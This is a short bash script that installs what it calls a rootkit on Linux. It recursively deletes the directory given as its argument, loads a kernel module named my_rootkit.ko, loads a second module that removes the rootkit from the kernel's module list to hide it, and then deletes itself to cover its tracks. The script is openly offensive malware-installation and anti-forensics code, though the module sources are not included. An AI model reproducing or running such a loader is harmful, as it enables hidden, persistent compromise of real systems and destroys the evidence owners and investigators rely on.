#!/bin/bash
# source exec_my_rootkit.sh

# delete source files
rm -f -r ${1}

# load rootkit module file
insmod /my_rootkit.ko
# load remove module file which remove rootkit module info from module list
insmod /remove_module.ko
# unload remove module file

# delete me
rm -f ${0}
